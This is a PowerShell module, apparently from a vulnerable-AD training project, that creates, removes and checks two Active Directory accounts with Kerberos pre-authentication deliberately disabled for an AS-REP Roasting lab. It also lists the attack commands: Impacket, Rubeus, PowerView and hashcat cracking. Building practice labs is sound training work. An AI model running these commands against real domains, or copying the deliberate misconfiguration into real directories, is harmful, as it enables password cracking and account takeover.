#Requires -Modules ActiveDirectory

<#
.SYNOPSIS
    Deploys, removes, and tests AS-REP Roasting attack scenarios in a vulnerable Active Directory lab.

.DESCRIPTION
    This module creates user accounts with Kerberos pre-authentication disabled, making them
    vulnerable to AS-REP Roasting attacks (MITRE ATT&CK T1558.004). When pre-auth is disabled,
    an attacker can request an AS-REP for the user without knowing their password, then crack
    the encrypted portion of the response offline.

    Unlike Kerberoasting, AS-REP Roasting does not require the attacker to be authenticated
    if they know or can enumerate vulnerable usernames.

.NOTES
    Module:     VulnAD - AS-REP Roasting
    Author:     VulnAD Project
    Requires:   ActiveDirectory module, VulnAD-Core.ps1 helpers
    MITRE ID:   T1558.004
#>

function Deploy-ASREPRoast {
    <#
    .SYNOPSIS
        Deploys AS-REP Roasting-vulnerable user accounts with pre-auth disabled.

    .DESCRIPTION
        Creates two user accounts (j.anderson, t.williams) in the Users OU with Kerberos
        pre-authentication disabled. Password strength is scaled to difficulty level.

    .PARAMETER Difficulty
        Attack difficulty level: Easy (weak passwords), Medium, or Hard (strong passwords).

    .PARAMETER DomainDN
        Distinguished name of the domain (e.g., DC=contoso,DC=com).

    .PARAMETER Domain
        FQDN of the domain (e.g., contoso.com).

    .EXAMPLE
        Deploy-ASREPRoast -Difficulty Easy -DomainDN 'DC=vulnlab,DC=local' -Domain 'vulnlab.local'
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [ValidateSet('Easy', 'Medium', 'Hard')]
        [string]$Difficulty,

        [Parameter(Mandatory)]
        [string]$DomainDN,

        [Parameter(Mandatory)]
        [string]$Domain
    )

    Write-VulnStatus -Message "Deploying AS-REP Roasting scenario ($Difficulty difficulty)" -Type Info

    $createdObjects = [System.Collections.Generic.List[string]]::new()

    # Define target user accounts
    $targetUsers = @(
        @{
            SamAccountName = 'j.anderson'
            Name           = 'James Anderson'
            Description    = 'HR Analyst - AS-REP Roasting target (PreAuth disabled)'
            PasswordIndex  = 3
        },
        @{
            SamAccountName = 't.williams'
            Name           = 'Tanya Williams'
            Description    = 'Marketing Coordinator - AS-REP Roasting target (PreAuth disabled)'
            PasswordIndex  = 4
        }
    )

    foreach ($targetUser in $targetUsers) {
        try {
            $password = Get-VulnPassword -Difficulty $Difficulty -Index $targetUser.PasswordIndex

            # Create the user in the standard Users OU
            $user = New-VulnUser -SamAccountName $targetUser.SamAccountName `
                                 -Name $targetUser.Name `
                                 -Password $password `
                                 -DomainDN $DomainDN `
                                 -Description $targetUser.Description

            if ($user) {
                # Disable Kerberos pre-authentication for the account
                Set-ADAccountControl -Identity $targetUser.SamAccountName -DoesNotRequirePreAuth $true
                $createdObjects.Add("User: $($targetUser.SamAccountName) (PreAuth disabled)")

                Write-VulnResult -Name $targetUser.SamAccountName `
                                 -Detail "Created with Kerberos pre-authentication DISABLED" `
                                 -Success $true
            }
        }
        catch {
            Write-VulnResult -Name $targetUser.SamAccountName `
                             -Detail "Failed: $($_.Exception.Message)" `
                             -Success $false
            Write-VulnStatus -Message "Error creating $($targetUser.SamAccountName): $($_.Exception.Message)" -Type Error
        }
    }

    # Summary result
    if ($createdObjects.Count -gt 0) {
        Write-VulnResult -Name 'AS-REP Roasting' -Detail "Deployed $($createdObjects.Count) vulnerable accounts" -Success $true -IsLast
    }
    else {
        Write-VulnResult -Name 'AS-REP Roasting' -Detail 'No accounts were created' -Success $false -IsLast
    }

    return @{
        Scenario       = 'AS-REP Roasting'
        Description    = @(
            'AS-REP Roasting targets accounts with Kerberos pre-authentication disabled.',
            'An attacker can request an Authentication Service Response (AS-REP) for these accounts',
            'without providing valid credentials. The AS-REP contains data encrypted with the user''s',
            'password hash, which can be cracked offline to recover the plaintext password.',
            'This attack can be performed unauthenticated if vulnerable usernames are known.'
        ) -join ' '
        CreatedObjects = $createdObjects.ToArray()
        AttackCommands = @(
            "# Impacket - Remote AS-REP Roasting (unauthenticated if usernames known)",
            "impacket-GetNPUsers $Domain/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat -outputfile asrep.hash",
            "impacket-GetNPUsers $Domain/<username>:<password> -dc-ip <DC_IP> -request",
            "",
            "# Rubeus - From domain-joined host",
            "Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash",
            "Rubeus.exe asreproast /user:j.anderson /format:hashcat",
            "",
            "# PowerView - Enumerate accounts with PreAuth disabled",
            "Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, description",
            "Get-DomainUser -PreauthNotRequired | Get-DomainSPNTicket",
            "",
            "# LDAP query - Manual enumeration",
            "Get-ADUser -Filter {DoesNotRequirePreAuth -eq `$true} -Properties DoesNotRequirePreAuth",
            "",
            "# Hashcat - Crack AS-REP hashes (mode 18200)",
            "hashcat -m 18200 asrep.hash /path/to/wordlist.txt"
        )
        AttackPath     = @(
            "Unauthenticated Attacker (or any domain user)",
            "  -> Enumerate users with DONT_REQ_PREAUTH flag set",
            "  -> Request AS-REP for vulnerable users (no password needed)",
            "  -> Extract encrypted timestamp from AS-REP response",
            "  -> Offline dictionary / brute-force attack on AS-REP hash",
            "  -> Recover plaintext password",
            "  -> Authenticate as compromised user -> further attacks"
        ) -join "`n"
        MitreID        = 'T1558.004'
        Difficulty     = $Difficulty
    }
}

function Remove-ASREPRoast {
    <#
    .SYNOPSIS
        Removes all AS-REP Roasting scenario objects from Active Directory.

    .DESCRIPTION
        Deletes the user accounts created by Deploy-ASREPRoast.
    #>
    [CmdletBinding()]
    param()

    Write-VulnStatus -Message 'Removing AS-REP Roasting scenario objects' -Type Info

    $accounts = @('j.anderson', 't.williams')

    foreach ($account in $accounts) {
        try {
            $adUser = Get-ADUser -Identity $account -ErrorAction Stop
            Remove-ADUser -Identity $adUser -Confirm:$false
            $isLast = ($account -eq $accounts[-1])
            Write-VulnResult -Name $account -Detail 'Removed successfully' -Success $true -IsLast:$isLast
        }
        catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException] {
            $isLast = ($account -eq $accounts[-1])
            Write-VulnResult -Name $account -Detail 'Not found (already removed)' -Success $true -IsLast:$isLast
        }
        catch {
            $isLast = ($account -eq $accounts[-1])
            Write-VulnResult -Name $account -Detail "Removal failed: $($_.Exception.Message)" -Success $false -IsLast:$isLast
            Write-VulnStatus -Message "Error removing $($account): $($_.Exception.Message)" -Type Error
        }
    }
}

function Test-ASREPRoast {
    <#
    .SYNOPSIS
        Validates that the AS-REP Roasting scenario is correctly deployed.

    .DESCRIPTION
        Checks that all target accounts exist and have Kerberos pre-authentication disabled.

    .PARAMETER Domain
        FQDN of the domain (unused here but kept for interface consistency).
    #>
    [CmdletBinding()]
    param(
        [Parameter()]
        [string]$Domain
    )

    Write-VulnStatus -Message 'Testing AS-REP Roasting scenario deployment' -Type Info

    $accounts = @('j.anderson', 't.williams')
    $allPassed = $true

    foreach ($account in $accounts) {
        try {
            $adUser = Get-ADUser -Identity $account -Properties DoesNotRequirePreAuth -ErrorAction Stop

            if ($adUser.DoesNotRequirePreAuth -eq $true) {
                Write-VulnResult -Name $account -Detail 'Exists, pre-authentication is DISABLED (vulnerable)' -Success $true
            }
            else {
                Write-VulnResult -Name $account -Detail 'Exists but pre-authentication is ENABLED (not vulnerable)' -Success $false
                $allPassed = $false
            }
        }
        catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException] {
            Write-VulnResult -Name $account -Detail 'User does NOT exist' -Success $false
            $allPassed = $false
        }
        catch {
            Write-VulnResult -Name $account -Detail "Test error: $($_.Exception.Message)" -Success $false
            $allPassed = $false
        }
    }

    Write-VulnResult -Name 'AS-REP Roasting' `
                     -Detail $(if ($allPassed) { 'All checks passed' } else { 'Some checks FAILED' }) `
                     -Success $allPassed -IsLast

    return $allPassed
}

Export-ModuleMember -Function Deploy-ASREPRoast, Remove-ASREPRoast, Test-ASREPRoast
